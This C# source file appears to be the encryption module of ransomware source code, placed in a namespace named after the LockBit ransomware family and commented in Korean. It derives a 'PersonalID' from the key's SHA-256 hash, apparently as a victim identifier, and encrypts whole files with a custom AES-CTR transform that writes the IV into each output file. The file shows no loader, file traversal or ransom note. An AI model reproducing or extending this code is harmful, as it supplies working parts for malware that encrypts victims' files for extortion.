using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace LockBIT
{
    internal static class Encryption
    {
        public static byte[] Key;

        // 키 문자열을 UTF-8 바이트 배열로 변환
        public static void SetKeyFromString(string keyString)
        {
            if (string.IsNullOrEmpty(keyString))
                throw new ArgumentException("Key string cannot be null or empty");

            Key = Encoding.UTF8.GetBytes(keyString);
        }

        // PersonalID 생성용 (기존 Run 메서드 대체)
        public static string GeneratePersonalID()
        {
            // null 체크 추가
            if (Key == null || Key.Length == 0)
                throw new InvalidOperationException("Key must be set before generating PersonalID");

            // 예시: 키 해시의 앞 16바이트를 HEX로 반환
            using (var sha = SHA256.Create())
            {
                var hash = sha.ComputeHash(Key);
                var sb = new StringBuilder(32);
                for (int i = 0; i < 16; i++)
                    sb.Append(hash[i].ToString("X2"));
                return sb.ToString();
            }
        }

        // 파일 암호화: AES-CTR 방식
        public static void EncryptFile(string inputFile, string outputFile)
        {
            if (Key == null || Key.Length == 0)
                throw new InvalidOperationException("Key must be set before encrypting files");

            byte[] iv = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
                rng.GetBytes(iv);

            using (var aes = Aes.Create())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                using (var encryptor = new IncrementalCounterModeTransform(aes, iv, Key))
                using (var fin = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (var fout = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                {
                    // IV 기록
                    fout.Write(iv, 0, iv.Length);

                    byte[] buffer = new byte[16 * 1024];
                    int read;
                    while ((read = fin.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        byte[] chunk = new byte[read];
                        encryptor.TransformBlock(buffer, 0, read, chunk, 0);
                        fout.Write(chunk, 0, chunk.Length);
                    }
                }
            }
        }

        // 기존 호환성을 위한 Run 메서드 (PersonalID 반환)
        public static string Run()
        {
            return GeneratePersonalID();
        }

        // AES-CTR 어댑터
        internal class IncrementalCounterModeTransform : ICryptoTransform
        {
            private readonly SymmetricAlgorithm _aes;
            private readonly byte[] _counter, _keystreamBlock, _key;
            private int _position;

            public IncrementalCounterModeTransform(SymmetricAlgorithm aes, byte[] iv, byte[] key)
            {
                _aes = aes;
                _key = key;
                _counter = (byte[])iv.Clone();
                _keystreamBlock = new byte[aes.BlockSize / 8];
                _position = _keystreamBlock.Length;
            }

            public int InputBlockSize => 1;
            public int OutputBlockSize => 1;
            public bool CanTransformMultipleBlocks => true;
            public bool CanReuseTransform => false;
            public void Dispose() => _aes.Dispose();

            public int TransformBlock(byte[] input, int inOffset, int count, byte[] output, int outOffset)
            {
                for (int i = 0; i < count; i++)
                {
                    if (_position >= _keystreamBlock.Length)
                    {
                        using (var enc = _aes.CreateEncryptor(_key, new byte[_aes.BlockSize / 8]))
                        {
                            enc.TransformBlock(_counter, 0, _counter.Length, _keystreamBlock, 0);
                            for (int j = _counter.Length - 1; j >= 0; j--)
                                if (++_counter[j] != 0) break;
                            _position = 0;
                        }
                    }
                    output[outOffset + i] = (byte)(input[inOffset + i] ^ _keystreamBlock[_position++]);
                }
                return count;
            }

            public byte[] TransformFinalBlock(byte[] input, int offset, int count)
            {
                var output = new byte[count];
                TransformBlock(input, offset, count, output, 0);
                return output;
            }
        }
    }
}
